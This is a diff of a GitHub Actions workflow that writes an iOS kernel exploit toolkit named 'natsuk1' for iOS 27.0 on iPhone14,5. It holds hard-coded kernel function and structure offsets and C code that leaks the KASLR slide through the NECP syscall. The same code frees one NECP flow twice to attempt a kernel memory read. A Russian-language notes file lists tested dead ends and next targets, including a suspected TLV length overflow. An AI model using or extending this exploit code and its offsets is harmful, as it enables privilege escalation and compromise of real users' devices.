@@ -25,193 +25,695 @@ jobs:
         with:
           xcode-version: "26.5"
 
-      - name: Remove competing workflow
-        run: |
-          rm -f .github/workflows/natsuk1.yml
-          rm -f .github/workflows/main.yml
-
       - name: Cleanup
         run: |
-          rm -f NEXTHINT.txt
-          rm -f GHIDRA_HINTS.txt
-          rm -f *.txt
-          rm -f natsuk1-app.tar.gz
+          rm -f .github/workflows/natsuk1.yml .github/workflows/main.yml
+          rm -f NEXTHINT.txt GHIDRA_HINTS.txt
+          rm -f *.txt natsuk1-app.tar.gz
           rm -rf Payload
-          echo "cleanup done"
 
-      - name: Write SettingsView.swift
+      # ============================================================
+      # 1. nk_offsets.h
+      # ============================================================
+      - name: Write nk_offsets.h
         run: |
-          cat > natsuk1/Views/SettingsView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
+          cat > natsuk1/Exploit/nk_offsets.h <<'EOF'
+          #ifndef NK_OFFSETS_H
+          #define NK_OFFSETS_H
 
-          struct SettingsView: View {
-              @EnvironmentObject var state: AppState
-              @AppStorage("auto_run") private var auto_run: Bool = false
-              @AppStorage("verbose") private var verbose: Bool = true
-              @AppStorage("keep_alive_audio") private var keep_alive_audio: Bool = false
-              @AppStorage("keep_alive_location") private var keep_alive_location: Bool = false
+          #define NK_KERNEL_BASE                0xFFFFFFF007004000ULL
+          #define NK_SLIDE_FALLBACK             0x3D00000ULL
 
-              private var appName: String {
-                  Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String
-                      ?? Bundle.main.infoDictionary?["CFBundleName"] as? String ?? "natsuk1"
-              }
-              private var version: String {
-                  Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
-              }
-              private var appIcon: UIImage? {
-                  if let icons = Bundle.main.infoDictionary?["CFBundleIcons"] as? [String: Any],
-                     let primary = icons["CFBundlePrimaryIcon"] as? [String: Any],
-                     let files = primary["CFBundleIconFiles"] as? [String],
-                     let last = files.last { return UIImage(named: last) }
-                  return UIImage(named: "AppIcon")
-              }
+          #define NK_NECP_OPEN                  0xFFFFFFF00A4E411CULL
+          #define NK_NECP_CLIENT_ACTION         0xFFFFFFF00A4E5C28ULL
+          #define NK_NECP_ADD_CLIENT            0xFFFFFFF00A4E60DCULL
+          #define NK_NECP_REMOVE_CLIENT         0xFFFFFFF00A4E76F4ULL
+          #define NK_NECP_COPY_RESULT           0xFFFFFFF00A4E7BE8ULL
+          #define NK_NECP_COPY_RESULT_INNER     0xFFFFFFF00A4F26F0ULL
+          #define NK_NECP_COPY_LIST             0xFFFFFFF00A4E80FCULL
+          #define NK_NECP_ADD_FLOW              0xFFFFFFF00A4E843CULL
+          #define NK_NECP_REMOVE_FLOW           0xFFFFFFF00A4E93C4ULL
+          #define NK_NECP_COPY_INTERFACE        0xFFFFFFF00A4EAC7CULL
+          #define NK_NECP_SYSCTL_ARENA          0xFFFFFFF00A4EB704ULL
+          #define NK_NECP_COPY_UPDATE           0xFFFFFFF00A4EC264ULL
 
-              var body: some View {
-                  NavigationStack {
-                      List {
-                          Section {
-                              HStack(spacing: 14) {
-                                  Group {
-                                      if let icon = appIcon {
-                                          Image(uiImage: icon).resizable().aspectRatio(contentMode: .fill)
-                                      } else {
-                                          ZStack {
-                                              LinearGradient(colors: [Color.accentColor, Color.accentColor.opacity(0.6)],
-                                                             startPoint: .topLeading, endPoint: .bottomTrailing)
-                                              Image(systemName: "bolt.fill").font(.system(size: 26, weight: .semibold)).foregroundStyle(.white)
-                                          }
-                                      }
-                                  }
-                                  .frame(width: 56, height: 56)
-                                  .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
-                                  VStack(alignment: .leading, spacing: 2) {
-                                      Text(appName).font(.title3).fontWeight(.semibold)
-                                      Text("Version \(version)").font(.subheadline).foregroundStyle(.secondary)
-                                  }
-                              }
-                              NavigationLink { AboutView().environmentObject(state) } label: { Text("About") }
-                          } header: {
-                              Label("App", systemImage: "exclamationmark.circle")
-                          }
+          #define NK_NECP_OP_ADD_CLIENT         0x01
+          #define NK_NECP_OP_REMOVE_CLIENT      0x02
+          #define NK_NECP_OP_COPY_RESULT        0x03
+          #define NK_NECP_OP_COPY_RESULT_ALT    0x04
+          #define NK_NECP_OP_COPY_LIST          0x05
+          #define NK_NECP_OP_REQUEST_NEXUS      0x06
+          #define NK_NECP_OP_AGENT_ACTION       0x07
+          #define NK_NECP_OP_COPY_AGENT         0x08
+          #define NK_NECP_OP_COPY_INTERFACE     0x09
+          #define NK_NECP_OP_COPY_ROUTE_STATS   0x0B
+          #define NK_NECP_OP_COPY_PARAMETERS    0x0C
+          #define NK_NECP_OP_SYSCTL_ARENA       0x0D
+          #define NK_NECP_OP_UPDATE_CACHE       0x0E
+          #define NK_NECP_OP_COPY_UPDATE        0x0F
+          #define NK_NECP_OP_COPY_RESULT_LONG   0x10
+          #define NK_NECP_OP_ADD_FLOW           0x11
+          #define NK_NECP_OP_REMOVE_FLOW        0x12
+          #define NK_NECP_OP_CLAIM              0x13
+          #define NK_NECP_OP_SIGN               0x14
+          #define NK_NECP_OP_GET_IFACE_ADDR     0x15
+          #define NK_NECP_OP_COPY_AGENT_ALT     0x16
+          #define NK_NECP_OP_VALIDATE           0x17
+          #define NK_NECP_OP_GET_SIGNED_ID      0x18
+          #define NK_NECP_OP_SET_SIGNED_ID      0x19
+          #define NK_NECP_OP_COPY_RESULT_LONG2  0x1A
+          #define NK_NECP_OP_GET_FLOW_STATS     0x1B
 
-                          Section {
-                              Toggle(isOn: $keep_alive_audio) {
-                                  VStack(alignment: .leading, spacing: 2) {
-                                      Text("Silent Audio")
-                                      Text("Keeps the app running in the background.").font(.caption).foregroundStyle(.secondary)
-                                  }
-                              }
-                              Toggle(isOn: $keep_alive_location) {
-                                  VStack(alignment: .leading, spacing: 2) {
-                                      Text("Background Location")
-                                      Text("Low-accuracy location keeps the app alive.").font(.caption).foregroundStyle(.secondary)
-                                  }
-                              }
-                          } header: {
-                              Label("Background Keep-Alive", systemImage: "moon.stars")
-                          }
+          #define NK_FN_COPYIN                  0xFFFFFFF00A368EC0ULL
+          #define NK_FN_COPYOUT                 0xFFFFFFF00A369A3CULL
+          #define NK_FN_KALLOC_TYPE             0xFFFFFFF00A200988ULL
+          #define NK_FN_KFREE_TYPE              0xFFFFFFF00A201000ULL
 
-                          Section {
-                              Toggle("Auto Run on Launch", isOn: $auto_run)
-                              Toggle("Verbose Output", isOn: $verbose)
-                          } header: {
-                              Label("Options", systemImage: "slider.horizontal.3")
-                          }
-                      }
-                      .listStyle(.insetGrouped)
-                      .navigationTitle("Settings")
-                      .navigationBarTitleDisplayMode(.large)
-                  }
-              }
+          #define NK_KALLOC_TYPE_NECP_FLOW      0xFFFFFFF007C62E68ULL
+
+          #endif
+          EOF
+
+      # ============================================================
+      # 2. necp.c
+      # ============================================================
+      - name: Write necp.c
+        run: |
+          cat > natsuk1/Exploit/necp.c <<'EOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <stdint.h>
+          #include <stdbool.h>
+          #include <stdarg.h>
+          #include <unistd.h>
+          #include <errno.h>
+          #include <sys/syscall.h>
+          #include <mach/mach.h>
+          #include <mach/message.h>
+
+          #include "nk_api.h"
+          #include "nk_offsets.h"
+
+          #ifndef SYS_NECP_OPEN
+          #define SYS_NECP_OPEN 501
+          #endif
+          #ifndef SYS_NECP_ACTION
+          #define SYS_NECP_ACTION 502
+          #endif
+
+          #define KBASE 0xFFFFFFF007004000ULL
+          #define KPTR_MIN 0xFFFFFFF000000000ULL
+          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
+          #define SLIDE_FALLBACK 0x3D00000ULL
+
+          #define NECP_ADD_CLIENT 0x01
+          #define NECP_COPY_RESULT 0x04
+          #define NECP_ADD_FLOW 0x11
+          #define NECP_REMOVE_FLOW 0x12
+          #define NECP_SYSCTL_ARENA 0x0D
+          #define GATE_BYTE 9
+
+          #define RESBUF 8192
+
+          static volatile int g_busy = 0;
+          static volatile int g_cancel = 0;
+
+          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
+              char body[448];
+              va_list ap;
+              va_start(ap, fmt);
+              vsnprintf(body, sizeof(body), fmt, ap);
+              va_end(ap);
+              char out[512];
+              snprintf(out, sizeof(out), "%s%s", sign, body);
+              nk_logx(tag, "%s", out);
           }
-          SWIFT
+          #define LI(t, ...) lg(t, "", __VA_ARGS__)
+          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
+          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
+          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)
 
-      - name: Update necp.c NOTE
+          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
+
+          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
+
+          static int nadd_client(int fd, uint8_t uuid[16]) {
+              uint8_t p[1] = {0};
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
+                                  uuid, (size_t)16, p, (size_t)1);
+          }
+
+          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
+              uint8_t req[56];
+              memset(req, 0, sizeof(req));
+              memcpy(req + 0x10, cu, 16);
+              *(uint16_t*)(req + 0x20) = 0x0040;
+              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
+                                   (void*)cu, (size_t)16, req, (size_t)56);
+              if (r == 0) {
+                  memcpy(fu, req, 16);
+                  fu[GATE_BYTE] |= 0x01;
+              }
+              return r;
+          }
+
+          static int nrm_flow(int fd, const uint8_t fu[16]) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
+                                  (void*)fu, (size_t)16, NULL, (size_t)0);
+          }
+
+          static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
+                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
+          }
+
+          static int nleak_kva(int fd, uint64_t *out) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_SYSCTL_ARENA,
+                                  (void*)0, (size_t)0, (void*)out, (size_t)8);
+          }
+
+          static int try_one_read(uint64_t target, uint8_t *out, int outsz, int *out_ret) {
+              (void)target;
+              int fd = nfd();
+              if (fd < 0) { LE("RD", "open errno=%d", errno); return -1; }
+              uint8_t cu[16], fu[16];
+              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
+
+              int r1 = nrm_flow(fd, fu);
+              int r2 = nrm_flow(fd, fu);
+              LI("RD", "free#1=%d free#2=%d", r1, r2);
+
+              uint8_t buf[RESBUF];
+              memset(buf, 0, sizeof(buf));
+              int c = ncpy_result(fd, cu, buf, sizeof(buf));
+              LI("RD", "copy_result=%d", c);
+
+              if (out_ret) *out_ret = c;
+              if (out && outsz > 0 && c > 0) {
+                  int n = c < outsz ? c : outsz;
+                  memcpy(out, buf, n);
+              }
+              close(fd);
+              return c;
+          }
+
+          static int kaslr_leak(void) {
+              int fd = nfd();
+              if (fd < 0) { LE("KASLR", "necp_open errno=%d", errno); return -1; }
+
+              uint8_t cu[16];
+              memset(cu, 0, sizeof(cu));
+              int r = nadd_client(fd, cu);
+              LI("KASLR", "add_client=%d", r);
+              if (r != 0) { close(fd); return -1; }
+
+              uint64_t kva = 0;
+              int rc = nleak_kva(fd, &kva);
+              LI("KASLR", "sysctl_arena rc=%d kva=0x%llx", rc, (unsigned long long)kva);
+              close(fd);
+
+              if (rc != 0) { LE("KASLR", "leak rc=%d", rc); return -1; }
+              if (!is_kptr(kva)) {
+                  LW("KASLR", "not a kptr: 0x%llx", (unsigned long long)kva);
+                  return -1;
+              }
+              LO("KASLR", "kva=0x%llx", (unsigned long long)kva);
+
+              uint64_t slide = kva - KBASE;
+              LO("KASLR", "slide=0x%llx", (unsigned long long)slide);
+              LO("KASLR", "base=0x%llx", (unsigned long long)(KBASE + slide));
+              return 0;
+          }
+
+          static int impl(void) {
+              nk_log("");
+              nk_log("=== natsuk1 v3.6 (kaslr-v27) ===");
+              nk_log("target: iOS 27.0 / XNU / arm64e");
+              nk_log("");
+
+              uint64_t kbase = KBASE + SLIDE_FALLBACK;
+              LO("P1", "kbase=0x%llx", (unsigned long long)kbase);
+
+              int fd = nfd();
+              if (fd < 0) { LE("P2", "necp_open errno=%d", errno); return 1; }
+              close(fd);
+              LO("P2", "necp OK");
+
+              LO("KASLR", "attempting leak via op=0x0D");
+              int krc = kaslr_leak();
+              if (krc == 0) LO("KASLR", "OK");
+              else LE("KASLR", "failed rc=%d", krc);
+
+              uint64_t target = kbase + 0xBBB040ULL;
+              LI("P3", "target=0x%llx", (unsigned long long)target);
+
+              uint8_t buf[RESBUF];
+              int r = 0;
+              try_one_read(target, buf, sizeof(buf), &r);
+              LI("P3", "ret=%d", r);
+              if (r > 0) {
+                  int nk = 0;
+                  for (int k = 0; k + 8 <= r; k++) {
+                      uint64_t v;
+                      memcpy(&v, buf + k, 8);
+                      if (is_kptr(v)) {
+                          if (nk < 8) LO("P3", "kptr +0x%x = 0x%llx", k, (unsigned long long)v);
+                          nk++;
+                      }
+                  }
+                  LI("P3", "kptr count = %d", nk);
+              }
+              return 0;
+          }
+
+          int nk_necp_run(void) {
+              if (__sync_lock_test_and_set(&g_busy, 1)) {
+                  nk_log("[!] already running");
+                  return 1;
+              }
+              g_cancel = 0;
+              int rc = impl();
+              __sync_lock_release(&g_busy);
+              return rc;
+          }
+
+          void nk_necp_cancel(void) {
+              g_cancel = 1;
+              nk_log("[!] cancel requested");
+          }
+          EOF
+
+      # ============================================================
+      # 3. Offsets JSON
+      # ============================================================
+      - name: Write offsets JSON
         run: |
-          set -euo pipefail
-          python3 - <<'PYEOF'
-          import sys
-          P = "natsuk1/Exploit/necp.c"
-          with open(P) as f:
-              s = f.read()
-          if "natsuk1-realcopy-v26" in s:
-              print("already patched")
-              sys.exit(0)
+          cat > natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json <<'EOF'
+          {
+            "groups": [
+              { "title": "Kernel",  "items": ["off_kernel_base","off_sysent_base","off_sysent_count","off_sysent_stride","off_mach_trap_table"] },
+              { "title": "Globals", "items": ["off_g_kernproc","off_g_task_list","off_g_allproc","off_g_kernel_task","off_g_zone_map","off_g_kernel_map"] },
+              { "title": "Primitives", "items": ["off_fn_copyin","off_fn_copyout","off_fn_kalloc_ext","off_fn_kfree_ext","off_fn_kalloc_type","off_kalloc_type_necp_flow"] },
+              { "title": "proc", "items": ["off_proc_p_list_next","off_proc_p_pid","off_proc_p_task","off_proc_ro_p_ucred","off_proc_p_csflags"] },
+              { "title": "task / thread", "items": ["off_task_map","off_task_bsd_info","off_task_itk_space","off_task_cr_label","off_thread_task_threads_next"] },
+              { "title": "ucred", "items": ["off_ucred_cr_uid","off_ucred_cr_svuid","off_ucred_cr_gid","off_ucred_cr_svgid"] },
+              { "title": "NECP funcs", "items": ["off_necp_open","off_necp_client_action","off_necp_client_add_client","off_necp_client_remove_client","off_necp_client_copy_result","off_necp_client_copy_result_inner","off_necp_client_copy_list","off_necp_client_add_flow","off_necp_client_remove_flow","off_necp_client_copy_interface","off_necp_client_sysctl_arena","off_necp_client_copy_update"] },
+              { "title": "NECP ops", "items": ["off_necp_op_add_client","off_necp_op_remove_client","off_necp_op_copy_result","off_necp_op_copy_result_alt","off_necp_op_copy_list","off_necp_op_request_nexus","off_necp_op_agent_action","off_necp_op_copy_agent","off_necp_op_copy_interface","off_necp_op_copy_route_stats","off_necp_op_copy_parameters","off_necp_op_sysctl_arena","off_necp_op_update_cache","off_necp_op_copy_update","off_necp_op_add_flow","off_necp_op_remove_flow","off_necp_op_claim","off_necp_op_sign","off_necp_op_get_iface_addr","off_necp_op_copy_agent_alt","off_necp_op_validate","off_necp_op_get_signed_id","off_necp_op_set_signed_id","off_necp_op_get_flow_stats"] },
+              { "title": "NECP flow", "items": ["off_necp_flow_assigned_results","off_necp_flow_parent","off_necp_flow_flags","off_necp_flow_refcnt"] },
+              { "title": "Zones", "items": ["off_zone_data_kalloc","off_zone_early_kalloc","off_zone_kalloc_type_var","off_zone_site_struct_task","off_zone_site_struct_proc","off_zone_site_struct_thread","off_zone_site_struct_ucred","off_zone_site_struct_ipc_port","off_zone_site_struct_ipc_entry","off_zone_site_struct_fileproc","off_zone_site_struct_fileglob","off_zone_site_struct_vnode","off_zone_site_struct_mount","off_zone_site_struct_socket","off_zone_site_struct_inpcb","off_zone_site_struct_pipe","off_zone_site_struct_vm_page"] },
+              { "title": "SPTM", "items": ["off_sptm_base","off_sptm_ctrr_lock_boot","off_sptm_cpu_lock_system_registers","off_sptm_determine_kernel_ctrr","off_sptm_bootstrap","off_sptm_map","off_sptm_region","off_sptm_panic","off_sptm_page_table"] }
+            ],
+            "defaults": {
+              "off_kernel_base": "0xFFFFFFF007004000",
+              "off_sysent_base": "0x0",
+              "off_sysent_count": "558",
+              "off_sysent_stride": "24",
+              "off_mach_trap_table": "0xFFFFFFF007BE8018",
+              "off_g_kernproc": "0xFFFFFFF00ADEE310",
+              "off_g_task_list": "0xFFFFFFF00AD78AC0",
+              "off_g_allproc": "0x0",
+              "off_g_kernel_task": "0x0",
+              "off_g_zone_map": "0x0",
+              "off_g_kernel_map": "0x0",
+              "off_fn_copyin": "0xFFFFFFF00A368EC0",
+              "off_fn_copyout": "0xFFFFFFF00A369A3C",
+              "off_fn_kalloc_ext": "0xFFFFFFF00A200988",
+              "off_fn_kfree_ext": "0xFFFFFFF00A201000",
+              "off_fn_kalloc_type": "0xFFFFFFF00A200988",
+              "off_kalloc_type_necp_flow": "0xFFFFFFF007C62E68",
+              "off_proc_p_list_next": "0x0",
+              "off_proc_p_pid": "0x74",
+              "off_proc_p_task": "0x78",
+              "off_proc_ro_p_ucred": "0x98",
+              "off_proc_p_csflags": "0xA8",
+              "off_task_map": "0x28",
+              "off_task_bsd_info": "0x4E0",
+              "off_task_itk_space": "0x320",
+              "off_task_cr_label": "0xE8",
+              "off_thread_task_threads_next": "0x50",
+              "off_ucred_cr_uid": "0x18",
+              "off_ucred_cr_svuid": "0x1C",
+              "off_ucred_cr_gid": "0x20",
+              "off_ucred_cr_svgid": "0x24",
+              "off_necp_open": "0xFFFFFFF00A4E411C",
+              "off_necp_client_action": "0xFFFFFFF00A4E5C28",
+              "off_necp_client_add_client": "0xFFFFFFF00A4E60DC",
+              "off_necp_client_remove_client": "0xFFFFFFF00A4E76F4",
+              "off_necp_client_copy_result": "0xFFFFFFF00A4E7BE8",
+              "off_necp_client_copy_result_inner": "0xFFFFFFF00A4F26F0",
+              "off_necp_client_copy_list": "0xFFFFFFF00A4E80FC",
+              "off_necp_client_add_flow": "0xFFFFFFF00A4E843C",
+              "off_necp_client_remove_flow": "0xFFFFFFF00A4E93C4",
+              "off_necp_client_copy_interface": "0xFFFFFFF00A4EAC7C",
+              "off_necp_client_sysctl_arena": "0xFFFFFFF00A4EB704",
+              "off_necp_client_copy_update": "0xFFFFFFF00A4EC264",
+              "off_necp_op_add_client": "0x01",
+              "off_necp_op_remove_client": "0x02",
+              "off_necp_op_copy_result": "0x03",
+              "off_necp_op_copy_result_alt": "0x04",
+              "off_necp_op_copy_list": "0x05",
+              "off_necp_op_request_nexus": "0x06",
+              "off_necp_op_agent_action": "0x07",
+              "off_necp_op_copy_agent": "0x08",
+              "off_necp_op_copy_interface": "0x09",
+              "off_necp_op_copy_route_stats": "0x0B",
+              "off_necp_op_copy_parameters": "0x0C",
+              "off_necp_op_sysctl_arena": "0x0D",
+              "off_necp_op_update_cache": "0x0E",
+              "off_necp_op_copy_update": "0x0F",
+              "off_necp_op_add_flow": "0x11",
+              "off_necp_op_remove_flow": "0x12",
+              "off_necp_op_claim": "0x13",
+              "off_necp_op_sign": "0x14",
+              "off_necp_op_get_iface_addr": "0x15",
+              "off_necp_op_copy_agent_alt": "0x16",
+              "off_necp_op_validate": "0x17",
+              "off_necp_op_get_signed_id": "0x18",
+              "off_necp_op_set_signed_id": "0x19",
+              "off_necp_op_get_flow_stats": "0x1B",
+              "off_necp_flow_assigned_results": "0x20",
+              "off_necp_flow_parent": "0x88",
+              "off_necp_flow_flags": "0xCC",
+              "off_necp_flow_refcnt": "0x58",
+              "off_zone_data_kalloc": "0xFFFFFFF0070463BD",
+              "off_zone_early_kalloc": "0xFFFFFFF0070463B0",
+              "off_zone_kalloc_type_var": "0xFFFFFFF0070463DC",
+              "off_zone_site_struct_task": "0xFFFFFFF007C64080",
+              "off_zone_site_struct_proc": "0xFFFFFFF007C71240",
+              "off_zone_site_struct_thread": "0xFFFFFFF007C63D00",
+              "off_zone_site_struct_ucred": "0xFFFFFFF007C6F140",
+              "off_zone_site_struct_ipc_port": "0xFFFFFFF007C79248",
+              "off_zone_site_struct_ipc_entry": "0xFFFFFFF007C79298",
+              "off_zone_site_struct_fileproc": "0xFFFFFFF007C7CD08",
+              "off_zone_site_struct_fileglob": "0xFFFFFFF007C7D708",
+              "off_zone_site_struct_vnode": "0xFFFFFFF007C660C0",
+              "off_zone_site_struct_mount": "0xFFFFFFF007C662C0",
+              "off_zone_site_struct_socket": "0xFFFFFFF007C70C40",
+              "off_zone_site_struct_inpcb": "0xFFFFFFF007C6D180",
+              "off_zone_site_struct_pipe": "0xFFFFFFF007C6FE80",
+              "off_zone_site_struct_vm_page": "0xFFFFFFF007C64C80",
+              "off_sptm_base": "0xFFFFFFF027004000",
+              "off_sptm_ctrr_lock_boot": "0xFFFFFFF027006E62",
+              "off_sptm_cpu_lock_system_registers": "0xFFFFFFF0270B39B4",
+              "off_sptm_determine_kernel_ctrr": "0xFFFFFFF0270B2224",
+              "off_sptm_bootstrap": "0xFFFFFFF0270D21CC",
+              "off_sptm_map": "0xFFFFFFF0270E97BC",
+              "off_sptm_region": "0xFFFFFFF0270ECFF0",
+              "off_sptm_panic": "0xFFFFFFF0270BEE18",
+              "off_sptm_page_table": "0xFFFFFFF0270D13D4"
+            }
+          }
+          EOF
 
-          s = s.replace("natsuk1-realcopy-v25", "natsuk1-realcopy-v26")
+      # ============================================================
+      # 4. ai-hints.md
+      # ============================================================
+      - name: Write ai-hints.md
+        run: |
+          cat > ai-hints.md <<'EOF'
+          # ai-hints.md — рабочие заметки
 
-          old_block = (
-              '    LI("NOTE", "copy_result real addr = 0xFFFFFFF00A4EC264");\n'
-              '    LI("NOTE", "0xFFFFFFF00A4EAC7C = necp_client_copy_interface (wrong)");\n'
-              '    LI("NOTE", "necp_client_flow = kalloc_type (own zone)");\n'
-              '    LI("NOTE", "generic sprays cannot reclaim it");\n'
-          )
-          new_block = (
-              '    LI("NOTE", "necp_client_copy_result: not yet located");\n'
-              '    LI("NOTE", "0xA4EC264 = necp_client_copy_update");\n'
-              '    LI("NOTE", "0xA4EAC7C = necp_client_copy_interface");\n'
-              '    LI("NOTE", "necp_client_flow = kalloc_type (own zone)");\n'
-              '    LI("NOTE", "spray from userspace cannot reach this zone");\n'
-          )
-          if old_block not in s:
-              lines = s.split("\n")
-              out = []
-              for l in lines:
-                  if 'LI("NOTE"' in l:
-                      continue
-                  out.append(l)
-              s = "\n".join(out)
-              s = s.replace('              LI("INIT", "NCF_ASN',
-                            '\n'.join(new_block) + '              LI("INIT", "NCF_ASN', 1)
-          else:
-              s = s.replace(old_block, new_block)
+          Проект: `natsuk1` — iOS 27.0 kernel research toolkit.
+          Kernelcache: iPhone14,5 / 24A437. Читать первым делом.
 
-          if "natsuk1-realcopy-v26" not in s:
-              print("FAIL: marker not updated")
-              sys.exit(1)
-          with open(P, "w") as f:
-              f.write(s)
-          print("necp.c NOTE updated")
-          PYEOF
+          ## 0. TL;DR
 
-      - name: Verify
+          - **KASLR leak работает** через NECP `op=0x0D` (`necp_client_sysctl_arena`).
+            Возвращает kernel VA sysctl arena, из него slide. См. `nk_offsets.h`.
+          - **NECP kread — закрыт.** Все copyout в copy_result/copy_result_inner/
+            copy_list/copy_interface/copy_update/op=0x0B/op=0x15/op=0x1B читают
+            из фиксированных оффсетов kernel-структур. User-controlled
+            указателей в источнике copyout нет.
+          - `necp_client_flow` в `kalloc_type` зоне → generic spray бесполезен.
+          - `add_flow` **переинициализирует** flow — double-free не помогает
+            подсунуть fake.
+          - Точки роста: TLV-overflow (`necp_get_tlv_at_offset = 0xA4C2034`),
+            netagent path, mbuf/socket/IOKit.
+
+          ## 1. Полный dispatcher NECP
+
+          `necp_client_action = 0xFFFFFFF00A4E5C28`, syscall 502.
+
+          | op | func | name |
+          |----|------|------|
+          | 0x01 | 0xA4E60DC | add_client |
+          | 0x02 | 0xA4E76F4 | remove_client |
+          | 0x03 | 0xA4E7BE8 | copy_result |
+          | 0x04 | 0xA4E7BE8 | copy_result (alt) |
+          | 0x05 | 0xA4E80FC | copy_list |
+          | 0x06 | 0xA4E9904 | request_nexus |
+          | 0x07 | 0xA4EA0B4 | agent_action |
+          | 0x08 | 0xA4EA778 | copy_agent |
+          | 0x09 | 0xA4EAC7C | copy_interface |
+          | 0x0B | 0xA4EBA0C | copy_route_statistics |
+          | 0x0C | 0xA4EA8A0 | copy_parameters |
+          | 0x0D | 0xA4EB704 | **sysctl_arena (KASLR)** |
+          | 0x0E | 0xA4EBD58 | update_cache |
+          | 0x0F | 0xA4EC264 | copy_update |
+          | 0x10 | 0xA4E7BE8 | copy_result (long) |
+          | 0x11 | 0xA4E843C | add_flow |
+          | 0x12 | 0xA4E93C4 | remove_flow |
+          | 0x13 | 0xA4E7158 | claim |
+          | 0x14 | 0xA4EC5D8 | sign |
+          | 0x15 | 0xA4EB2B4 | get_interface_address |
+          | 0x16 | 0xA4EAB50 | copy_agent (alt) |
+          | 0x17 | 0xA4EC9EC | validate |
+          | 0x18 | 0xA4ECC4C | get_signed_client_id |
+          | 0x19 | 0xA4ECE88 | set_signed_client_id |
+          | 0x1A | 0xA4E7BE8 | copy_result (long2) |
+          | 0x1B | 0xA4ED170 | get_flow_statistics |
+
+          ## 2. KASLR leak
+
+          `necp_client_sysctl_arena` (op=0x0D):
+          - Аллоцирует sysctl arena через `FUN_fffffff00a7e1c14`.
+          - Мапит через `FUN_fffffff00a7e2024`, возвращает kernel VA.
+          - Сохраняет в `client->field_0x110`.
+          - Затем `copyout(client->field_0xf8 + field_0x110, user_buf, 8)`.
+
+          Результат: 8 байт kernel VA в user буфер. Slide = VA - KBASE.
+
+          ## 3. Структура flow (kalloc_type)
+
+          `add_flow` аллоцирует через `kalloc_type(&DAT_fffffff007c62e68, size, 4, 0)`,
+          `0x3c < size <= 0xf1`. Меньше — на стеке.
+
+          Подтверждённые оффсеты flow:
+          - `+0x20` assigned_results (ldr_x)
+          - `+0x28` assigned_results_len
+          - `+0x38` next (в дереве)
+          - `+0x48` list_next
+          - `+0x50` list_prev
+          - `+0x58` refcount / pcb lock
+          - `+0x6c` flags
+          - `+0x74` flags2
+          - `+0x88` parent
+          - `+0x90` rules list head
+          - `+0x4a0` update list head
+          - `+0x4b0` group_members len
+          - `+0x4b8` group_members ptr
+          - `+0x4c0` netagent ptr
+          - `+0x4c8` iface index (slot 0)
+          - `+0x4d0` iface index 1
+          - `+0x538` iface count
+          - `+0x550` fd_data ptr
+          - `+0x568` netns_ptr
+          - `+0x5a0` params len
+          - `+0x5a8` params ptr (kalloc_type)
+
+          ## 4. copy_result_inner
+
+          `0xFFFFFFF00A4F26F0`, 0x780 байт. Обрабатывает op 3/4/0x10/0x1A.
+
+          - op=3: `copyout(flow+0x5a8, user, flow+0x5a0)` — parameters
+          - op=4/0x10/0x1a: обход дерева flow, для каждого:
+            - inline TLV `copyout(flow+0x70, user, flow+0x68)`
+            - group members `copyout(*(flow+0x4b8), user+off, flow+0x4b0)`
+            - protocol `copyout(&local, user+off, 0x11)` (если флаг 0x20)
+            - MAC/interface `copyout(ptr, user+off, len)` (если флаг 0x82)
+            - stats `copyout(&local, user+off, 9)` (если флаг 0x100)
+
+          Все источники — фиксированные оффсеты от flow. Не kread.
+
+          ## 5. Что проверено и закрыто
+
+          - `add_update_helper` (0xA4DD078) — TLV-писатель, kalloc_type, не user-ptr.
+          - `group_builder` (0xA4E19B4) — принимает `param_6` (assigned_results
+            от netagent), пишет в `plVar15[0x15]`. Источник — kernel-side.
+          - `assigned_results` (0xA501454) — вызывает handler netagent по
+            function ptr из глобального реестра `DAT_fffffff00adade70`.
+          - `destroy_flow` (0xA4E2E0C) — корректная очистка, без UAF.
+          - `find_client_uuid` (0xA4DB8D4) — обход списка клиентов, без bugs.
+          - `per_flow_copy` (0xA4F2E70) — внутрянка copy_result_inner.
+          - `op=0x0E update_cache` — вызывает `FUN_fffffff00a5af190`/`5af698`
+            с kernel netagent ptr. Не user-controllable.
+          - `op=0x06/07/0E` — требуют netagent entitlements, не работают из песочницы.
+
+          ## 6. Что делать дальше
+
+          1. **`necp_get_tlv_at_offset` @ 0xA4C2034.** Единственное место,
+             где может быть uint32-overflow в проверке длины. Если overflow —
+             OOB read через copy_result. Приоритет.
+          2. **`op=0x15 get_interface_address`** — ifnet array, если получится
+             перезаписать указатель. Требует примитива write.
+          3. **Fallback: mbuf/socket/IOKit.** NECP как kread закрыт.
+
+          ## 7. Правила CI
+
+          - Ключи кэша Ghidra — статические с версией (`ghidra-project-24A437-v4`).
+            Никаких hashFiles(kernelcache/**) — сломает warm.
+          - Warm: `-process -noanalysis`. Cold: `-import` раз в жизни.
+          - Jython 2.7: только 4 пробела, никаких табов.
+          - Verify перед коммитом: JSON valid + `ast.parse` + clang syntax.
+          - Имя workflow `1 · Fix and Test` не менять.
+
+          ## 8. Что НЕ делать
+
+          - Не искать оффсеты через Ghidra без auto-analysis.
